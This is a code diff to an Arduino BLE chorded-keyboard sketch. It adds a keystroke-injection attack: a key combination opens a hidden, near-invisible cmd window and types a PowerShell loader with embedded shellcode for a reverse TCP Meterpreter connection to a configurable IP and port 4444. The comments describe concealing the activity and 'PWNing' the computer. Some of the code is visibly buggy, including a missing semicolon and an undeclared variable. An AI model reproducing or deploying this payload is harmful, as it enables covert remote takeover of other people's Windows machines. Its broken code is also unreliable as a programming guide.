@@ -74,6 +74,13 @@ Adafruit_BluefruitLE_SPI ble(BLUEFRUIT_SPI_CS, BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_
 //                             BLUEFRUIT_SPI_MOSI, BLUEFRUIT_SPI_CS,
 //                             BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_RST);
 
+
+int ip[] = {192,168,1,1}; // The IP address for Reverse_TCP connection
+int port = 4444; // The port - outward facing port, not internal port.
+
+char net_info[] = "0x@@,0x@@,0x@@,0x@@,0x68,0x02,0x00,0x@@,0x@@,0x89,";
+
+
 // A small helper
 void error(const __FlashStringHelper*err) {
   Serial.println(err);
@@ -83,6 +90,23 @@ void error(const __FlashStringHelper*err) {
 // moved to KeyCodes.h
 
 // moved to ChordMappings.h
+
+void parseNet()
+{
+    char hex[16] = {'0','1','2','3',
+                    '4','5','6','7',
+                    '8','9','a','b',
+                    'c','d','e','f'};
+    int i;
+    for (i = 0; i < 4; ++i) {
+        net_info[(i*5)+2] = hex[ip[i]/16]; // Turn the parts of the IP address into hex and insert them into 
+        net_info[(i*5)+3] = hex[ip[i]%16]; // the network info portion of the shellcode
+    }
+    net_info[37] = hex[(port / 256) / 16]; // Do the same, but for the port
+    net_info[38] = hex[(port / 256) % 16];
+    net_info[42] = hex[(port % 256) / 16];
+    net_info[43] = hex[(port % 256) % 16];
+}
 
 
 class Button {
@@ -121,7 +145,7 @@ void setup(void)
    digitalWrite(EnPin, HIGH);  // and activate pullup.
   //while (!Serial);  // Required for Flora & Micro
   delay(500);
-
+  parseNet()
   Serial.begin(115200);
   Serial.println(F("Adafruit Bluefruit HID Chorder"));
   Serial.println(F("---------------------------------------"));
@@ -368,8 +392,8 @@ void sendKey(byte keyState){
     break;
   // Handle the opening and attachment of meterpreter shells (ONLY WORKS ON WINDOWS!)
   case METERPRETER_hack:
-    sendRawKey(0x80, 0x15);
-    openCmdPrompt();
+    openCmdPrompt(); 
+    delay(2500);
     attachMeterpreter();
     break;
   case MEDIA_playpause:
@@ -406,14 +430,88 @@ void sendKey(byte keyState){
     mode = NUMSYM;
   }
 }
-void openCmdPrompt() {
-    ble.print("AT+BLEKEYBOARD=");
-    ble.println("cmd.exe");
-    sendRawKey(
+void openCmdPrompt(){
+    sendRawKey(0x80, 0x15); //Open the run menu (Windowskey-R)
+    delay(500); // A little bit of delay to allow the RUN menu to open
+    
+    /* Next we bring up the cmd window with the minimum size and contrast as low as we can possibly make it
+       This combined with the speed of the character entry makes it virtually impossible to figure out
+       what we are doing to the target computer. */
+    
+    sendString("cmd.exe /T:01 /K MODE CON: COLS=17 LINES=1"); // This is really useful for HID exploitation                           
+    
+    sendRawKey(0x00, 0x28); // Sends the enter key to bring up the specified cmd window.
 }
 
-void attachMeterpreter() {
+void attachMeterpreter(){
+    // Set the path for powershell-based code execution
+    sendString("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
+    sendRawKey(0x00, 0x28); //Send the enter key
+    delay(500);
     
+    // Actually enter the shellcode
+    sendString("%PWRSHLXDD% -nop -w hidden -c \"$1 = '$c = ''");
+    sendString("[DllImport(\\\"kernel32.dll\\\")]public static ext");
+    sendString("ern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwS");
+    sendString("ize, uint flAllocationType, uint flProtect);[DllIm");
+    sendString("port(\\\"kernel32.dll\\\")]public static extern In");
+    sendString("tPtr CreateThread(IntPtr lpThreadAttributes, uint ");
+    sendString("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
+    sendString("eter, uint dwCreationFlags, IntPtr lpThreadId);[Dl");
+    sendString("lImport(\\\"msvcrt.dll\\\")]public static extern I");
+    sendString("ntPtr memset(IntPtr dest, uint src, uint count);''");
+    sendString(";$w = Add-Type -memberDefinition $c -Name \\\"Win3");
+    sendString("2\\\" -namespace Win32Functions -passthru;[Byte[]]");
+    sendString(";[Byte[]]$sc = ");
+    sendString("0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
+    sendString("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
+    sendString("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
+    sendString("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
+    sendString("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
+    sendString("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
+    sendString("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
+    sendString("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
+    sendString("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
+    sendString("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
+    sendString("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
+    sendString("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
+    sendString("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
+    sendString("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
+    sendString("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
+    sendString("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
+    sendString("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
+    sendString("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
+    sendString("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
+    sendString("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
+    sendString(net_info);  // Print out required network information.
+    sendString("0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,");
+    sendString("0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,");
+    sendString("0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,");
+    sendString("0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,");
+    sendString("0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,");
+    sendString("0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,");
+    sendString("0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,");
+    sendString("0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,");
+    sendString("0x75,0xec,0xc3;");
+    sendString("$size = 0x1000;if ($sc.Length -gt 0");
+    sendString("x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0");
+    sendString("x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);");
+    sendString("$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$");
+    sendString("i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){St");
+    sendString("art-sleep 60};';$gq = [System.Convert]::ToBase64St");
+    sendString("ring([System.Text.Encoding]::Unicode.GetBytes($1))");
+    sendString(";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot +");
+    sendString(" \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\");
+    sendString("powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex");
+    sendString(" \\\" $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni");
+    sendString(" -enc\\\";iex \\\" powershell $cmd $gq\\\";}\"");
+    delay(500);
+    /****************
+    *    PWN IT!   *
+    ****************/
+    
+    sendRawKey(0x00, 0x28); // Enter key again, this time it runs the shellcode and PWNs the computer.
+    delay(500);
 }
 void sendRawKey(char modKey, char rawKey){
     // Format for Bluefruit Feather is MOD-00-KEY.
@@ -425,6 +523,20 @@ void sendRawKey(char modKey, char rawKey){
     ble.println("AT+BLEKEYBOARDCODE=00-00");
 }
 
+void sendString(String commandstring){
+    uint16_t length = sizeof(commandstring) / sizeof(commandstring[0]); // Find the size of the string to be sent
+    uint16_t lengthOfAsciiSet = sizeof(asciicodemappings) / sizeof(asciicodemappings[0]); //Get the size of the ASCII code mappings tables
+    for(i = 0; i <= length; i++) { // Iterate through each character of the input string
+        char charToSend = commandstring[i]; // Save the character that should be sent
+        uint8_t asciiIndex = 0; // For each iteration, we need to loop through the ASCII table and find out what index the character we need to send is at
+        while(asciiIndex <= lengthOfAsciiSet && asciicodemappings[asciiIndex] != charToSend) { // Actually looping through
+            asciiindex++;
+        }
+        sendRawKey(asciimodifiermappings[asciiIndex], asciikeycodemaps[asciiIndex]); // Send the correct key with the correct modifiers. 
+    }
+}
+    
+    
 void sendControlKey(String cntrlName){
   // note: for Volume +/- and the few other keys that take a time to hold, simply add it into the string
   // for example:
@@ -480,4 +592,3 @@ void loop() {
 
   lastKeyState = keyState;
 }
-
